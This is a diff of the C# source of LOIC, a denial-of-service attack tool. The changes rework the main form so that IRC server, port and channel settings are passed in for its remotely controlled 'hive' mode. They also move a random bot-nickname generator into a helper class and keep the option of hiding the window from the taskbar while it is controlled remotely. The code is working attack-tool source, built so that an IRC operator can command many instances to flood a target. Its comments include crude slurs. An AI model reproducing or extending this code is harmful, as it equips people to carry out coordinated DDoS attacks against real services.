@@ -20,37 +20,29 @@ namespace LOIC
 		private static string sIP, sMethod, sData, sSubsite;
 		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
 		private static bool bResp, intShowStats;
-        private IrcClient irc;
-        private Thread irclisten;
-        private string channel;
-        private static bool ircenabled = false;
-        private Dictionary<string, string> OpList;
-        private delegate void CheckParamsDelegate(List<string> pars);
-		public frmMain(bool hive, bool hide, string server)
+		private IrcClient irc;
+		private Thread irclisten;
+		private string channel;
+		private static bool ircenabled = false;
+		private Dictionary<string, string> OpList;
+		private delegate void CheckParamsDelegate(List<string> pars);
+		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
 		{
 			InitializeComponent();
-            txtIRCserver.Text = server;
-            if ( hide )
-            {
-                this.WindowState = FormWindowState.Minimized;
-                this.ShowInTaskbar = false;
-            }
-            this.FormClosing += frmMain_Closing;
-            if (hive) enableHive.Checked = true;
-            if (!hive) disableHive.Checked = true;
+			/* IRC */
+			txtIRCserver.Text = ircserver;
+			txtIRCport.Text = ircport;
+			txtIRCchannel.Text = ircchannel;
+			/* Lets try this! */
+			if ( hide )
+			{
+			    this.WindowState = FormWindowState.Minimized;
+			    this.ShowInTaskbar = false;
+			}
+			this.FormClosing += frmMain_Closing;
+			if (hive) enableHive.Checked = true;
+			if (!hive) disableHive.Checked = true;
 		}
-        private string RandomString()
-        {
-            StringBuilder builder = new StringBuilder();
-            Random random = new Random();
-            char ch;
-            for (int i = 0; i < 6; i++)
-            {
-                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
-                builder.Append(ch);
-            }
-            return builder.ToString();
-        }
         private void Attack(bool toggle, bool on, bool silent)
         {
             if ((cmdAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
@@ -223,7 +215,7 @@ namespace LOIC
                         channel = txtIRCchannel.Text;
                         // irc.WriteLine(Rfc2812.Nick("loicbot"),Priority.Critical);
                         // irc.WriteLine(Rfc2812.User("loic", 0, "ACSLaw"),Priority.Critical);
-                        irc.Login("LOIC_" + RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
+                        irc.Login("LOIC_" + new Functions().RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
 
                         //Spawn a fuckign thread to handle the listen.. why!?!?
                         irclisten = new Thread(new ThreadStart(IrcListenThread));
@@ -263,7 +255,7 @@ namespace LOIC
                     int port;
                     if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
                     irc.Connect(txtIRCserver.Text, port);
-                    irc.Login("LOIC_" + RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
+                    irc.Login("LOIC_" + new Functions().RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
                 }
                 catch
                 { }
